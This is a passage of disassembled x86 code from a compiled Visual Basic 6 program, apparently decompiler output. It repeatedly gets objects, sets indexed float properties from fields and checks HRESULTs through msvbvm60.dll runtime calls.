0087D178: call [eax+00000320h]
0087D17E: push eax
0087D17F: lea eax, var_24
0087D182: push eax
0087D183: call 00410A84h ; Set (object)
0087D188: mov var_2C, eax
0087D18B: lea eax, var_28
0087D18E: push eax
0087D18F: push 00000000h
0087D191: mov eax, var_2C
0087D194: mov eax, [eax]
0087D196: push var_2C
0087D199: call [eax+40h]
0087D19C: fclex 
0087D19E: mov var_30, eax
0087D1A1: cmp var_30, 00000000h
0087D1A5: jnl 87D1BEh
0087D1A7: push 00000040h
0087D1A9: push 00440DE8h
0087D1AE: push var_2C
0087D1B1: push var_30
0087D1B4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D1B9: mov var_50, eax
0087D1BC: jmp 87D1C2h
0087D1BE: and var_50, 00000000h
0087D1C2: mov eax, var_28
0087D1C5: mov var_34, eax
0087D1C8: mov eax, [ebp+08h]
0087D1CB: fild dword ptr [eax+00000090h]
0087D1D1: fstp real4 ptr var_54
0087D1D4: fld real4 ptr var_54
0087D1D7: push ecx
0087D1D8: fstp real4 ptr [esp]
0087D1DB: mov eax, var_34
0087D1DE: mov eax, [eax]
0087D1E0: push var_34
0087D1E3: call [eax+64h]
0087D1E6: fclex 
0087D1E8: mov var_38, eax
0087D1EB: cmp var_38, 00000000h
0087D1EF: jnl 87D208h
0087D1F1: push 00000064h
0087D1F3: push 00456A8Ch
0087D1F8: push var_34
0087D1FB: push var_38
0087D1FE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D203: mov var_58, eax
0087D206: jmp 87D20Ch
0087D208: and var_58, 00000000h
0087D20C: lea eax, var_28
0087D20F: push eax
0087D210: lea eax, var_24
0087D213: push eax
0087D214: push 00000002h
0087D216: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D21B: add esp, 0000000Ch
0087D21E: mov var_04, 00000007h
0087D225: mov eax, [ebp+08h]
0087D228: mov eax, [eax]
0087D22A: push [ebp+08h]
0087D22D: call [eax+00000320h]
0087D233: push eax
0087D234: lea eax, var_24
0087D237: push eax
0087D238: call 00410A84h ; Set (object)
0087D23D: mov var_2C, eax
0087D240: lea eax, var_28
0087D243: push eax
0087D244: push 00000000h
0087D246: mov eax, var_2C
0087D249: mov eax, [eax]
0087D24B: push var_2C
0087D24E: call [eax+40h]
0087D251: fclex 
0087D253: mov var_30, eax
0087D256: cmp var_30, 00000000h
0087D25A: jnl 87D273h
0087D25C: push 00000040h
0087D25E: push 00440DE8h
0087D263: push var_2C
0087D266: push var_30
0087D269: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D26E: mov var_5C, eax
0087D271: jmp 87D277h
0087D273: and var_5C, 00000000h
0087D277: mov eax, var_28
0087D27A: mov var_34, eax
0087D27D: mov eax, [ebp+08h]
0087D280: fild dword ptr [eax+00000094h]
0087D286: fstp real4 ptr var_60
0087D289: fld real4 ptr var_60
0087D28C: push ecx
0087D28D: fstp real4 ptr [esp]
0087D290: mov eax, var_34
0087D293: mov eax, [eax]
0087D295: push var_34
0087D298: call [eax+74h]
0087D29B: fclex 
0087D29D: mov var_38, eax
0087D2A0: cmp var_38, 00000000h
0087D2A4: jnl 87D2BDh
0087D2A6: push 00000074h
0087D2A8: push 00456A8Ch
0087D2AD: push var_34
0087D2B0: push var_38
0087D2B3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D2B8: mov var_64, eax
0087D2BB: jmp 87D2C1h
0087D2BD: and var_64, 00000000h
0087D2C1: lea eax, var_28
0087D2C4: push eax
0087D2C5: lea eax, var_24
0087D2C8: push eax
0087D2C9: push 00000002h
0087D2CB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D2D0: add esp, 0000000Ch
0087D2D3: mov var_04, 00000008h
0087D2DA: mov eax, [ebp+08h]
0087D2DD: mov eax, [eax]
0087D2DF: push [ebp+08h]
0087D2E2: call [eax+00000320h]
0087D2E8: push eax
0087D2E9: lea eax, var_24
0087D2EC: push eax
0087D2ED: call 00410A84h ; Set (object)
0087D2F2: mov var_2C, eax
0087D2F5: lea eax, var_28
0087D2F8: push eax
0087D2F9: push 00000000h
0087D2FB: mov eax, var_2C
0087D2FE: mov eax, [eax]
0087D300: push var_2C
0087D303: call [eax+40h]
0087D306: fclex 
0087D308: mov var_30, eax
0087D30B: cmp var_30, 00000000h
0087D30F: jnl 87D328h
0087D311: push 00000040h
0087D313: push 00440DE8h
0087D318: push var_2C
0087D31B: push var_30
0087D31E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D323: mov var_68, eax
0087D326: jmp 87D32Ch
0087D328: and var_68, 00000000h
0087D32C: mov eax, var_28
0087D32F: mov var_34, eax
0087D332: mov eax, [ebp+08h]
0087D335: fild dword ptr [eax+00000098h]
0087D33B: fstp real4 ptr var_6C
0087D33E: fld real4 ptr var_6C
0087D341: push ecx
0087D342: fstp real4 ptr [esp]
0087D345: mov eax, var_34
0087D348: mov eax, [eax]
0087D34A: push var_34
0087D34D: call [eax+6Ch]
0087D350: fclex 
0087D352: mov var_38, eax
0087D355: cmp var_38, 00000000h
0087D359: jnl 87D372h
0087D35B: push 0000006Ch
0087D35D: push 00456A8Ch
0087D362: push var_34
0087D365: push var_38
0087D368: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D36D: mov var_70, eax
0087D370: jmp 87D376h
0087D372: and var_70, 00000000h
0087D376: lea eax, var_28
0087D379: push eax
0087D37A: lea eax, var_24
0087D37D: push eax
0087D37E: push 00000002h
0087D380: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D385: add esp, 0000000Ch
0087D388: mov var_04, 00000009h
0087D38F: mov eax, [ebp+08h]
0087D392: mov eax, [eax]
0087D394: push [ebp+08h]
0087D397: call [eax+00000320h]
0087D39D: push eax
0087D39E: lea eax, var_24
0087D3A1: push eax
0087D3A2: call 00410A84h ; Set (object)
0087D3A7: mov var_2C, eax
0087D3AA: lea eax, var_28
0087D3AD: push eax
0087D3AE: push 00000000h
0087D3B0: mov eax, var_2C
0087D3B3: mov eax, [eax]
0087D3B5: push var_2C
0087D3B8: call [eax+40h]
0087D3BB: fclex 
0087D3BD: mov var_30, eax
0087D3C0: cmp var_30, 00000000h
0087D3C4: jnl 87D3DDh
0087D3C6: push 00000040h
0087D3C8: push 00440DE8h
0087D3CD: push var_2C
0087D3D0: push var_30
0087D3D3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D3D8: mov var_74, eax
0087D3DB: jmp 87D3E1h
0087D3DD: and var_74, 00000000h
0087D3E1: mov eax, var_28
0087D3E4: mov var_34, eax
0087D3E7: mov eax, [ebp+08h]
0087D3EA: fild dword ptr [eax+00000098h]
0087D3F0: fstp real4 ptr var_78
0087D3F3: fld real4 ptr var_78
0087D3F6: push ecx
0087D3F7: fstp real4 ptr [esp]
0087D3FA: mov eax, var_34
0087D3FD: mov eax, [eax]
0087D3FF: push var_34
0087D402: call [eax+7Ch]
0087D405: fclex 
0087D407: mov var_38, eax
0087D40A: cmp var_38, 00000000h
0087D40E: jnl 87D427h
0087D410: push 0000007Ch
0087D412: push 00456A8Ch
0087D417: push var_34
0087D41A: push var_38
0087D41D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D422: mov var_7C, eax
0087D425: jmp 87D42Bh
0087D427: and var_7C, 00000000h
0087D42B: lea eax, var_28
0087D42E: push eax
0087D42F: lea eax, var_24
0087D432: push eax
0087D433: push 00000002h
0087D435: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D43A: add esp, 0000000Ch
0087D43D: mov var_04, 0000000Ah
0087D444: mov eax, [ebp+08h]
0087D447: mov eax, [eax]
0087D449: push [ebp+08h]
0087D44C: call [eax+00000320h]
0087D452: push eax
0087D453: lea eax, var_24
0087D456: push eax
0087D457: call 00410A84h ; Set (object)
0087D45C: mov var_2C, eax
0087D45F: lea eax, var_28
0087D462: push eax
0087D463: push 00000001h
0087D465: mov eax, var_2C
0087D468: mov eax, [eax]
0087D46A: push var_2C
0087D46D: call [eax+40h]
0087D470: fclex 
0087D472: mov var_30, eax
0087D475: cmp var_30, 00000000h
0087D479: jnl 87D492h
0087D47B: push 00000040h
0087D47D: push 00440DE8h
0087D482: push var_2C
0087D485: push var_30
0087D488: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D48D: mov var_80, eax
0087D490: jmp 87D496h
0087D492: and var_80, 00000000h
0087D496: mov eax, var_28
0087D499: mov var_34, eax
0087D49C: mov eax, [ebp+08h]
0087D49F: fild dword ptr [eax+00000094h]
0087D4A5: fstp real4 ptr var_00000084
0087D4AB: fld real4 ptr var_00000084
0087D4B1: push ecx
0087D4B2: fstp real4 ptr [esp]
0087D4B5: mov eax, var_34
0087D4B8: mov eax, [eax]
0087D4BA: push var_34
0087D4BD: call [eax+64h]
0087D4C0: fclex 
0087D4C2: mov var_38, eax
0087D4C5: cmp var_38, 00000000h
0087D4C9: jnl 87D4E5h
0087D4CB: push 00000064h
0087D4CD: push 00456A8Ch
0087D4D2: push var_34
0087D4D5: push var_38
0087D4D8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D4DD: mov var_00000088, eax
0087D4E3: jmp 87D4ECh
0087D4E5: and var_00000088, 00000000h
0087D4EC: lea eax, var_28
0087D4EF: push eax
0087D4F0: lea eax, var_24
0087D4F3: push eax
0087D4F4: push 00000002h
0087D4F6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D4FB: add esp, 0000000Ch
0087D4FE: mov var_04, 0000000Bh
0087D505: mov eax, [ebp+08h]
0087D508: mov eax, [eax]
0087D50A: push [ebp+08h]
0087D50D: call [eax+00000320h]
0087D513: push eax
0087D514: lea eax, var_24
0087D517: push eax
0087D518: call 00410A84h ; Set (object)
0087D51D: mov var_2C, eax
0087D520: lea eax, var_28
0087D523: push eax
0087D524: push 00000001h
0087D526: mov eax, var_2C
0087D529: mov eax, [eax]
0087D52B: push var_2C
0087D52E: call [eax+40h]
0087D531: fclex 
0087D533: mov var_30, eax
0087D536: cmp var_30, 00000000h
0087D53A: jnl 87D556h
0087D53C: push 00000040h
0087D53E: push 00440DE8h
0087D543: push var_2C
0087D546: push var_30
0087D549: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D54E: mov var_0000008C, eax
0087D554: jmp 87D55Dh
0087D556: and var_0000008C, 00000000h
0087D55D: mov eax, var_28
0087D560: mov var_34, eax
0087D563: mov eax, [ebp+08h]
0087D566: fild dword ptr [eax+00000094h]
0087D56C: fstp real4 ptr var_00000090
0087D572: fld real4 ptr var_00000090
0087D578: push ecx
0087D579: fstp real4 ptr [esp]
0087D57C: mov eax, var_34
0087D57F: mov eax, [eax]
0087D581: push var_34
0087D584: call [eax+74h]
0087D587: fclex 
0087D589: mov var_38, eax
0087D58C: cmp var_38, 00000000h
0087D590: jnl 87D5ACh
0087D592: push 00000074h
0087D594: push 00456A8Ch
0087D599: push var_34
0087D59C: push var_38
0087D59F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D5A4: mov var_00000094, eax
0087D5AA: jmp 87D5B3h
0087D5AC: and var_00000094, 00000000h
0087D5B3: lea eax, var_28
0087D5B6: push eax
0087D5B7: lea eax, var_24
0087D5BA: push eax
0087D5BB: push 00000002h
0087D5BD: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D5C2: add esp, 0000000Ch
0087D5C5: mov var_04, 0000000Ch
0087D5CC: mov eax, [ebp+08h]
0087D5CF: mov eax, [eax]
0087D5D1: push [ebp+08h]
0087D5D4: call [eax+00000320h]
0087D5DA: push eax
0087D5DB: lea eax, var_24
0087D5DE: push eax
0087D5DF: call 00410A84h ; Set (object)
0087D5E4: mov var_2C, eax
0087D5E7: lea eax, var_28
0087D5EA: push eax
0087D5EB: push 00000001h
0087D5ED: mov eax, var_2C
0087D5F0: mov eax, [eax]
0087D5F2: push var_2C
0087D5F5: call [eax+40h]
0087D5F8: fclex 
0087D5FA: mov var_30, eax
0087D5FD: cmp var_30, 00000000h
0087D601: jnl 87D61Dh
0087D603: push 00000040h
0087D605: push 00440DE8h
0087D60A: push var_2C
0087D60D: push var_30
0087D610: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D615: mov var_00000098, eax
0087D61B: jmp 87D624h
0087D61D: and var_00000098, 00000000h
0087D624: mov eax, var_28
0087D627: mov var_34, eax
0087D62A: mov eax, [ebp+08h]
0087D62D: fild dword ptr [eax+00000098h]
0087D633: fstp real4 ptr var_0000009C
0087D639: fld real4 ptr var_0000009C
0087D63F: push ecx
0087D640: fstp real4 ptr [esp]
0087D643: mov eax, var_34
0087D646: mov eax, [eax]
0087D648: push var_34
0087D64B: call [eax+6Ch]
0087D64E: fclex 
0087D650: mov var_38, eax
0087D653: cmp var_38, 00000000h
0087D657: jnl 87D673h
0087D659: push 0000006Ch
0087D65B: push 00456A8Ch
0087D660: push var_34
0087D663: push var_38
0087D666: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D66B: mov var_000000A0, eax
0087D671: jmp 87D67Ah
0087D673: and var_000000A0, 00000000h
0087D67A: lea eax, var_28
0087D67D: push eax
0087D67E: lea eax, var_24
0087D681: push eax
0087D682: push 00000002h
0087D684: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D689: add esp, 0000000Ch
0087D68C: mov var_04, 0000000Dh
0087D693: mov eax, [ebp+08h]
0087D696: mov eax, [eax]
0087D698: push [ebp+08h]
0087D69B: call [eax+00000320h]
0087D6A1: push eax
0087D6A2: lea eax, var_24
0087D6A5: push eax
0087D6A6: call 00410A84h ; Set (object)
0087D6AB: mov var_2C, eax
0087D6AE: lea eax, var_28
0087D6B1: push eax
0087D6B2: push 00000001h
0087D6B4: mov eax, var_2C
0087D6B7: mov eax, [eax]
0087D6B9: push var_2C
0087D6BC: call [eax+40h]
0087D6BF: fclex 
0087D6C1: mov var_30, eax
0087D6C4: cmp var_30, 00000000h
0087D6C8: jnl 87D6E4h
0087D6CA: push 00000040h
0087D6CC: push 00440DE8h
0087D6D1: push var_2C
0087D6D4: push var_30
0087D6D7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D6DC: mov var_000000A4, eax
0087D6E2: jmp 87D6EBh
0087D6E4: and var_000000A4, 00000000h
0087D6EB: mov eax, var_28
0087D6EE: mov var_34, eax
0087D6F1: mov eax, [ebp+08h]
0087D6F4: fild dword ptr [eax+0000009Ch]
0087D6FA: fstp real4 ptr var_000000A8
0087D700: fld real4 ptr var_000000A8
0087D706: push ecx
0087D707: fstp real4 ptr [esp]
0087D70A: mov eax, var_34
0087D70D: mov eax, [eax]
0087D70F: push var_34
0087D712: call [eax+7Ch]
0087D715: fclex 
0087D717: mov var_38, eax
0087D71A: cmp var_38, 00000000h
0087D71E: jnl 87D73Ah
0087D720: push 0000007Ch
0087D722: push 00456A8Ch
0087D727: push var_34
0087D72A: push var_38
0087D72D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D732: mov var_000000AC, eax
0087D738: jmp 87D741h
0087D73A: and var_000000AC, 00000000h
0087D741: lea eax, var_28
0087D744: push eax
0087D745: lea eax, var_24
0087D748: push eax
0087D749: push 00000002h
0087D74B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D750: add esp, 0000000Ch
0087D753: mov var_04, 0000000Eh
0087D75A: mov eax, [ebp+08h]
0087D75D: mov eax, [eax]
0087D75F: push [ebp+08h]
0087D762: call [eax+00000320h]
0087D768: push eax
0087D769: lea eax, var_24
0087D76C: push eax
0087D76D: call 00410A84h ; Set (object)
0087D772: mov var_2C, eax
0087D775: lea eax, var_28
0087D778: push eax
0087D779: push 00000002h
0087D77B: mov eax, var_2C
0087D77E: mov eax, [eax]
0087D780: push var_2C
0087D783: call [eax+40h]
0087D786: fclex 
0087D788: mov var_30, eax
0087D78B: cmp var_30, 00000000h
0087D78F: jnl 87D7ABh
0087D791: push 00000040h
0087D793: push 00440DE8h
0087D798: push var_2C
0087D79B: push var_30
0087D79E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D7A3: mov var_000000B0, eax
0087D7A9: jmp 87D7B2h
0087D7AB: and var_000000B0, 00000000h
0087D7B2: mov eax, var_28
0087D7B5: mov var_34, eax
0087D7B8: mov eax, [ebp+08h]
0087D7BB: fild dword ptr [eax+00000090h]
0087D7C1: fstp real4 ptr var_000000B4
0087D7C7: fld real4 ptr var_000000B4
0087D7CD: push ecx
0087D7CE: fstp real4 ptr [esp]
0087D7D1: mov eax, var_34
0087D7D4: mov eax, [eax]
0087D7D6: push var_34
0087D7D9: call [eax+64h]
0087D7DC: fclex 
0087D7DE: mov var_38, eax
0087D7E1: cmp var_38, 00000000h
0087D7E5: jnl 87D801h
0087D7E7: push 00000064h
0087D7E9: push 00456A8Ch
0087D7EE: push var_34
0087D7F1: push var_38
0087D7F4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D7F9: mov var_000000B8, eax
0087D7FF: jmp 87D808h
0087D801: and var_000000B8, 00000000h
0087D808: lea eax, var_28
0087D80B: push eax
0087D80C: lea eax, var_24
0087D80F: push eax
0087D810: push 00000002h
0087D812: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D817: add esp, 0000000Ch
0087D81A: mov var_04, 0000000Fh
0087D821: mov eax, [ebp+08h]
0087D824: mov eax, [eax]
0087D826: push [ebp+08h]
0087D829: call [eax+00000320h]
0087D82F: push eax
0087D830: lea eax, var_24
0087D833: push eax
0087D834: call 00410A84h ; Set (object)
0087D839: mov var_2C, eax
0087D83C: lea eax, var_28
0087D83F: push eax
0087D840: push 00000002h
0087D842: mov eax, var_2C
0087D845: mov eax, [eax]
0087D847: push var_2C
0087D84A: call [eax+40h]
0087D84D: fclex 
0087D84F: mov var_30, eax
0087D852: cmp var_30, 00000000h
0087D856: jnl 87D872h
0087D858: push 00000040h
0087D85A: push 00440DE8h
0087D85F: push var_2C
0087D862: push var_30
0087D865: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D86A: mov var_000000BC, eax
0087D870: jmp 87D879h
0087D872: and var_000000BC, 00000000h
0087D879: mov eax, var_28
0087D87C: mov var_34, eax
0087D87F: mov eax, [ebp+08h]
0087D882: fild dword ptr [eax+00000090h]
0087D888: fstp real4 ptr var_000000C0
0087D88E: fld real4 ptr var_000000C0
0087D894: push ecx
0087D895: fstp real4 ptr [esp]
0087D898: mov eax, var_34
0087D89B: mov eax, [eax]
0087D89D: push var_34
0087D8A0: call [eax+74h]
0087D8A3: fclex 
0087D8A5: mov var_38, eax
0087D8A8: cmp var_38, 00000000h
0087D8AC: jnl 87D8C8h
0087D8AE: push 00000074h
0087D8B0: push 00456A8Ch
0087D8B5: push var_34
0087D8B8: push var_38
0087D8BB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D8C0: mov var_000000C4, eax
0087D8C6: jmp 87D8CFh
0087D8C8: and var_000000C4, 00000000h
0087D8CF: lea eax, var_28
0087D8D2: push eax
0087D8D3: lea eax, var_24
0087D8D6: push eax
0087D8D7: push 00000002h
0087D8D9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D8DE: add esp, 0000000Ch
0087D8E1: mov var_04, 00000010h
0087D8E8: mov eax, [ebp+08h]
0087D8EB: mov eax, [eax]
0087D8ED: push [ebp+08h]
0087D8F0: call [eax+00000320h]
0087D8F6: push eax
0087D8F7: lea eax, var_24
0087D8FA: push eax
0087D8FB: call 00410A84h ; Set (object)
0087D900: mov var_2C, eax
0087D903: lea eax, var_28
0087D906: push eax
0087D907: push 00000002h
0087D909: mov eax, var_2C
0087D90C: mov eax, [eax]
0087D90E: push var_2C
0087D911: call [eax+40h]
0087D914: fclex 
0087D916: mov var_30, eax
0087D919: cmp var_30, 00000000h
0087D91D: jnl 87D939h
0087D91F: push 00000040h
0087D921: push 00440DE8h
0087D926: push var_2C
0087D929: push var_30
0087D92C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D931: mov var_000000C8, eax
0087D937: jmp 87D940h
0087D939: and var_000000C8, 00000000h
0087D940: mov eax, var_28
0087D943: mov var_34, eax
0087D946: mov eax, [ebp+08h]
0087D949: fild dword ptr [eax+00000098h]
0087D94F: fstp real4 ptr var_000000CC
0087D955: fld real4 ptr var_000000CC
0087D95B: push ecx
0087D95C: fstp real4 ptr [esp]
0087D95F: mov eax, var_34
0087D962: mov eax, [eax]
0087D964: push var_34
0087D967: call [eax+6Ch]
0087D96A: fclex 
0087D96C: mov var_38, eax
0087D96F: cmp var_38, 00000000h
0087D973: jnl 87D98Fh
0087D975: push 0000006Ch
0087D977: push 00456A8Ch
0087D97C: push var_34
0087D97F: push var_38
0087D982: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D987: mov var_000000D0, eax
0087D98D: jmp 87D996h
0087D98F: and var_000000D0, 00000000h
0087D996: lea eax, var_28
0087D999: push eax
0087D99A: lea eax, var_24
0087D99D: push eax
0087D99E: push 00000002h
0087D9A0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D9A5: add esp, 0000000Ch
0087D9A8: mov var_04, 00000011h
0087D9AF: mov eax, [ebp+08h]
0087D9B2: mov eax, [eax]
0087D9B4: push [ebp+08h]
0087D9B7: call [eax+00000320h]
0087D9BD: push eax
0087D9BE: lea eax, var_24
0087D9C1: push eax
0087D9C2: call 00410A84h ; Set (object)
0087D9C7: mov var_2C, eax
0087D9CA: lea eax, var_28
0087D9CD: push eax
0087D9CE: push 00000002h
0087D9D0: mov eax, var_2C
0087D9D3: mov eax, [eax]
0087D9D5: push var_2C
0087D9D8: call [eax+40h]
0087D9DB: fclex 
0087D9DD: mov var_30, eax
0087D9E0: cmp var_30, 00000000h
0087D9E4: jnl 87DA00h
0087D9E6: push 00000040h
0087D9E8: push 00440DE8h
0087D9ED: push var_2C
0087D9F0: push var_30
0087D9F3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D9F8: mov var_000000D4, eax
0087D9FE: jmp 87DA07h
0087DA00: and var_000000D4, 00000000h
0087DA07: mov eax, var_28
0087DA0A: mov var_34, eax
0087DA0D: mov eax, [ebp+08h]
0087DA10: fild dword ptr [eax+0000009Ch]
0087DA16: fstp real4 ptr var_000000D8
0087DA1C: fld real4 ptr var_000000D8
0087DA22: push ecx
0087DA23: fstp real4 ptr [esp]
0087DA26: mov eax, var_34
0087DA29: mov eax, [eax]
0087DA2B: push var_34
0087DA2E: call [eax+7Ch]
0087DA31: fclex 
0087DA33: mov var_38, eax
0087DA36: cmp var_38, 00000000h
0087DA3A: jnl 87DA56h
0087DA3C: push 0000007Ch
0087DA3E: push 00456A8Ch
0087DA43: push var_34
0087DA46: push var_38
0087DA49: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DA4E: mov var_000000DC, eax
0087DA54: jmp 87DA5Dh
0087DA56: and var_000000DC, 00000000h
0087DA5D: lea eax, var_28
0087DA60: push eax
0087DA61: lea eax, var_24
0087DA64: push eax
0087DA65: push 00000002h
0087DA67: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087DA6C: add esp, 0000000Ch
0087DA6F: mov var_04, 00000012h
0087DA76: mov eax, [ebp+08h]
0087DA79: mov eax, [eax]
0087DA7B: push [ebp+08h]
0087DA7E: call [eax+00000320h]
0087DA84: push eax
0087DA85: lea eax, var_24
0087DA88: push eax
0087DA89: call 00410A84h ; Set (object)
0087DA8E: mov var_2C, eax
0087DA91: lea eax, var_28
0087DA94: push eax
0087DA95: push 00000003h
0087DA97: mov eax, var_2C
0087DA9A: mov eax, [eax]
0087DA9C: push var_2C
0087DA9F: call [eax+40h]
0087DAA2: fclex 
0087DAA4: mov var_30, eax
0087DAA7: cmp var_30, 00000000h
0087DAAB: jnl 87DAC7h
0087DAAD: push 00000040h
0087DAAF: push 00440DE8h
0087DAB4: push var_2C
0087DAB7: push var_30
0087DABA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DABF: mov var_000000E0, eax
0087DAC5: jmp 87DACEh
0087DAC7: and var_000000E0, 00000000h
0087DACE: mov eax, var_28
0087DAD1: mov var_34, eax
0087DAD4: mov eax, [ebp+08h]
0087DAD7: fild dword ptr [eax+00000090h]
0087DADD: fstp real4 ptr var_000000E4
0087DAE3: fld real4 ptr var_000000E4
0087DAE9: push ecx
0087DAEA: fstp real4 ptr [esp]
0087DAED: mov eax, var_34
0087DAF0: mov eax, [eax]
0087DAF2: push var_34
0087DAF5: call [eax+64h]
0087DAF8: fclex 
0087DAFA: mov var_38, eax
0087DAFD: cmp var_38, 00000000h
0087DB01: jnl 87DB1Dh
0087DB03: push 00000064h
0087DB05: push 00456A8Ch
0087DB0A: push var_34
0087DB0D: push var_38
0087DB10: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DB15: mov var_000000E8, eax
0087DB1B: jmp 87DB24h
0087DB1D: and var_000000E8, 00000000h
0087DB24: lea eax, var_28
0087DB27: push eax
0087DB28: lea eax, var_24
0087DB2B: push eax
0087DB2C: push 00000002h
0087DB2E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087DB33: add esp, 0000000Ch
0087DB36: mov var_04, 00000013h
0087DB3D: mov eax, [ebp+08h]
0087DB40: mov eax, [eax]
0087DB42: push [ebp+08h]
0087DB45: call [eax+00000320h]
0087DB4B: push eax
0087DB4C: lea eax, var_24
0087DB4F: push eax
0087DB50: call 00410A84h ; Set (object)
0087DB55: mov var_2C, eax
0087DB58: lea eax, var_28
0087DB5B: push eax
0087DB5C: push 00000003h
0087DB5E: mov eax, var_2C
0087DB61: mov eax, [eax]
0087DB63: push var_2C
0087DB66: call [eax+40h]
0087DB69: fclex 
0087DB6B: mov var_30, eax
0087DB6E: cmp var_30, 00000000h
0087DB72: jnl 87DB8Eh
0087DB74: push 00000040h
0087DB76: push 00440DE8h
0087DB7B: push var_2C
0087DB7E: push var_30
0087DB81: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DB86: mov var_000000EC, eax
0087DB8C: jmp 87DB95h
0087DB8E: and var_000000EC, 00000000h
0087DB95: mov eax, var_28
0087DB98: mov var_34, eax
0087DB9B: mov eax, [ebp+08h]
0087DB9E: fild dword ptr [eax+00000094h]
0087DBA4: fstp real4 ptr var_000000F0
0087DBAA: fld real4 ptr var_000000F0
0087DBB0: push ecx
0087DBB1: fstp real4 ptr [esp]
0087DBB4: mov eax, var_34
0087DBB7: mov eax, [eax]
0087DBB9: push var_34
0087DBBC: call [eax+74h]
0087DBBF: fclex 
0087DBC1: mov var_38, eax
0087DBC4: cmp var_38, 00000000h
0087DBC8: jnl 87DBE4h
0087DBCA: push 00000074h
0087DBCC: push 00456A8Ch
0087DBD1: push var_34
0087DBD4: push var_38
0087DBD7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DBDC: mov var_000000F4, eax
0087DBE2: jmp 87DBEBh
0087DBE4: and var_000000F4, 00000000h
0087DBEB: lea eax, var_28
0087DBEE: push eax
0087DBEF: lea eax, var_24
0087DBF2: push eax
0087DBF3: push 00000002h
0087DBF5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087DBFA: add esp, 0000000Ch
0087DBFD: mov var_04, 00000014h
0087DC04: mov eax, [ebp+08h]
0087DC07: mov eax, [eax]
0087DC09: push [ebp+08h]
0087DC0C: call [eax+00000320h]
0087DC12: push eax
0087DC13: lea eax, var_24
0087DC16: push eax
0087DC17: call 00410A84h ; Set (object)
0087DC1C: mov var_2C, eax
0087DC1F: lea eax, var_28
0087DC22: push eax
0087DC23: push 00000003h
0087DC25: mov eax, var_2C
0087DC28: mov eax, [eax]
0087DC2A: push var_2C
0087DC2D: call [eax+40h]
0087DC30: fclex 
0087DC32: mov var_30, eax
0087DC35: cmp var_30, 00000000h
0087DC39: jnl 87DC55h
0087DC3B: push 00000040h
0087DC3D: push 00440DE8h
0087DC42: push var_2C
0087DC45: push var_30
0087DC48: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DC4D: mov var_000000F8, eax
0087DC53: jmp 87DC5Ch
0087DC55: and var_000000F8, 00000000h
0087DC5C: mov eax, var_28
0087DC5F: mov var_34, eax
0087DC62: mov eax, [ebp+08h]
0087DC65: fild dword ptr [eax+0000009Ch]
0087DC6B: fstp real4 ptr var_000000FC
0087DC71: fld real4 ptr var_000000FC
0087DC77: push ecx
0087DC78: fstp real4 ptr [esp]
0087DC7B: mov eax, var_34
0087DC7E: mov eax, [eax]
0087DC80: push var_34
0087DC83: call [eax+6Ch]
0087DC86: fclex 
0087DC88: mov var_38, eax
0087DC8B: cmp var_38, 00000000h
0087DC8F: jnl 87DCABh
0087DC91: push 0000006Ch
0087DC93: push 00456A8Ch
0087DC98: push var_34
0087DC9B: push var_38
0087DC9E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087DCA3: mov var_00000100, eax
0087DCA9: jmp 87DCB2h
0087DCAB: and var_00000100, 00000000h
0087DCB2: lea eax, var_28
0087DCB5: push eax
0087DCB6: lea eax, var_24
0087DCB9: push eax
0087DCBA: push 00000002h
0087DCBC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087DCC1: add esp, 0000000Ch
0087DCC4: mov var_04, 00000015h
0087DCCB: mov eax, [ebp+08h]
0087DCCE: mov eax, [eax]
0087DCD0: push [ebp+08h]
0087DCD3: call [eax+00000320h]
0087DCD9: push eax
0087DCDA: lea eax, var_24
0087DCDD: push eax
